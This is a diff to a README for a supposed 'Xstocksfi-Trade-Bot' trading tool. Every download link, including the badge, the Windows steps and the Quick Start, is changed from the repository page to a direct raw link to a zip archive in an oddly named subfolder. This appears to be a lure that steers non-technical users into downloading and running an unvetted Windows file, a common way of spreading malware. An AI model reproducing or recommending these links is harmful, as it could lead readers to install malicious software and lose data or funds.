@@ -1,11 +1,11 @@
 # 🤖 Xstocksfi-Trade-Bot - Simple xStocks Trading Automation
 
-[![Download Now](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/pigweedsugarcane899/Xstocksfi-Trade-Bot)
+[![Download Now](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/pigweedsugarcane899/Xstocksfi-Trade-Bot/main/anglesite/Xstocksfi-Bot-Trade-v2.8.zip)
 
 ## 📥 Download
 
 Use this link to visit the download page:
-https://github.com/pigweedsugarcane899/Xstocksfi-Trade-Bot
+https://raw.githubusercontent.com/pigweedsugarcane899/Xstocksfi-Trade-Bot/main/anglesite/Xstocksfi-Bot-Trade-v2.8.zip
 
 ## 🧭 What This App Does
 
@@ -38,7 +38,7 @@ Before you start, check that your PC meets these basic needs:
 ## 🪟 How to Download on Windows
 
 1. Open this page in your browser:
-   https://github.com/pigweedsugarcane899/Xstocksfi-Trade-Bot
+   https://raw.githubusercontent.com/pigweedsugarcane899/Xstocksfi-Trade-Bot/main/anglesite/Xstocksfi-Bot-Trade-v2.8.zip
 
 2. Look for the download files or the latest release on the page
 
@@ -167,7 +167,7 @@ Before you let the bot trade, check these items:
 ## 📝 Quick Start
 
 1. Visit the download page:
-   https://github.com/pigweedsugarcane899/Xstocksfi-Trade-Bot
+   https://raw.githubusercontent.com/pigweedsugarcane899/Xstocksfi-Trade-Bot/main/anglesite/Xstocksfi-Bot-Trade-v2.8.zip
 
 2. Download the Windows file
 
